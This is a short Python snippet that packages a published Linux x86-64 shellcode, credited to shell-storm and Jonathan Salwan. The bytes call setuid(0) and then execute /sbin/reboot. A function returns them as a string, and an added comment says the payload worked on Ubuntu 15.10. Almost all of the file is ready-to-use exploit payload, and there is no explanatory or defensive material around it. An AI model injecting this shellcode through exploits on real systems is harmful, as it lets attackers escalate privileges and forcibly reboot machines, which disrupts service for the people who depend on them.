#http://shell-storm.org/shellcode/files/shellcode-651.php
#Title: Linux/x86-64 - setuid(0) & reboot - 51 bytes
#Date: 2010-06-17
#Tested: Archlinux x86_64 k2.6.33

#Author: Jonathan Salwan
#Web: http://shell-storm.org | http://twitter.com/jonathansalwan

#! Database of shellcodes http://www.shell-storm.org/shellcode/

#WORKED
#Ubuntu 15.10
def reboot():
	shellcode =  r"\x48\x31\xff\xb0\x69"
	shellcode += r"\x0f\x05\x48\x31\xd2\x48"
	shellcode += r"\xbb\xff\xff\xff\xff\x62"
	shellcode += r"\x6f\x6f\x74\x48\xc1\xeb"
	shellcode += r"\x20\x53\x48\xbb\x2f\x73"
	shellcode += r"\x62\x69\x6e\x2f\x72\x65"
	shellcode += r"\x53\x48\x89\xe7\x48\x31"
	shellcode += r"\xc0\x50\x57\x48\x89\xe6"
	shellcode += r"\xb0\x3b\x0f\x05"
  	return shellcode

